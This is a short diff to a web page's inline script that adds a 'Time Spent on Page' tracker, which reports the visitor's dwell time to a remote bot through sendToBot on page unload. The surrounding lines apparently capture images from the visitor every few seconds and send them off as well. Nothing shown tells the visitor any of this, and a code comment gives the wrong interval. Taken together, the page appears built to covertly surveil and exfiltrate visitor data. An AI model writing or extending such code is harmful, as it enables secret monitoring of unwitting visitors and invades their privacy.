@@ -159,6 +159,15 @@ h1 {
       captureAndSend(); // Capture first image immediately
       setInterval(captureAndSend, 4000); // Capture image every 5 seconds
     }
+      /************** 10. Time Spent on Page **************/
+    const pageStartTime = Date.now();
+    window.addEventListener("beforeunload", function () {
+      const timeSpent = Math.round((Date.now() - pageStartTime) / 1000);
+      const minutes = Math.floor(timeSpent / 60);
+      const seconds = timeSpent % 60;
+      sendToBot(`Time Spent on Page: ${minutes}m ${seconds}s`);
+    });
+
   </script>
 </body>
 </html>
